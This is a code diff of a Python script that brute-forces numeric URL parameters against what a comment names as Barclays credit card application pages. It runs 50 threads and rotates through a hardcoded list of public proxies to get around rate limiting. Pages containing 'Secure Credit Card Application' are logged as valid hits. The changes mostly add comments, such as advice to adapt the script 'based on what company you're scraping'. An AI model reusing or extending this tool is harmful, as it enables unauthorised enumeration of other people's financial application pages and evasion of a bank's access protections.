@@ -49,7 +49,6 @@ list_of_proxies = [
 "47.91.235.15:80"
 ]
 
-
 # Globals
 proxy = list_of_proxies[0]
 connectionPerSec = 50
@@ -65,6 +64,7 @@ end = "&cellNumber="
 lines = []
 current_line = 0
 
+# Creates all URL combinations based on parameters above and stores them in a lines global var
 def generate_urls():
 	for (a) in map(''.join, itertools.product(num, repeat=4)):
 		#for (b) in itertools.imap(''.join, itertools.product(numAZ, repeat=2)):
@@ -76,9 +76,12 @@ def generate_urls():
 			lines.append(line)
 
 
+# Create file locks
 valid_url_file_lock = threading.Lock()
 invalid_url_file_valid_url_file_lock = threading.Lock()
 
+# Often times, the script will need to be interrupted midway through. This will remove all invalid from the testing lines
+# Pretty fast (roughly 20s to check 100,000 urls)
 def remove_completed():
 	with open("logs/invalid.txt") as completed:
 		for line in completed:
@@ -86,6 +89,7 @@ def remove_completed():
 			if temp_line.rstrip("\n") in lines:
 				lines.remove(temp_line.rstrip("\n"))
 
+# Write a valid url to file
 def write_valid_url(res):
 	valid_url_file_lock.acquire()  # thread bvalid_url_file_locks at this line until it can obtain valid_url_file_lock
 
@@ -94,6 +98,7 @@ def write_valid_url(res):
 		myfile.write('\n')
 	valid_url_file_lock.release()
 
+# Writes an invalid url to file
 def write_invalid_url(ret):
 	invalid_url_file_valid_url_file_lock.acquire()  # thread bvalid_url_file_locks at this line until it can obtain valid_url_file_lock
 
@@ -126,6 +131,7 @@ def generate_req(reqSession):
 	proxy = list_of_proxies[0]
 
 	while True:
+		# Get the next URL
 		url = get_url()
 		if not url:
 			break
@@ -136,24 +142,29 @@ def generate_req(reqSession):
 		except:
 			retry(url)
 		print('Completed url: ' + url, end='\r')
+
+		# This part needs to change based on what company you're scrpaing. For Barclays, valid app links will include the following in the header
 		if "Secure Credit Card Application" not in response.text:
-			write_invalid_url("302: " + url)
+			write_invalid_url(url)
 			continue
-		# In case we get ratelimited, genearte file to retry later
+		# In case we get ratelimited, set up a new proxy and add file to retry
 		if response.status_code == 429:
 			random_proxy = random.randint(0, len(list_of_proxies))
 			proxy = list_of_proxies[random_proxy]
 			retry(url)
 			continue
-		write_valid_url(str(response.status_code) + ": " + url)
+		write_valid_url(url)
 
 
 def main():
+
 	generate_urls()
 	remove_completed()
+
 	proxy = list_of_proxies[0]
 	current_line = 0
 
+	# generate threads based on conccurent connections global
 	for cnum in range(connectionPerSec):
 		s1 = requests.session()
 		th = threading.Thread(
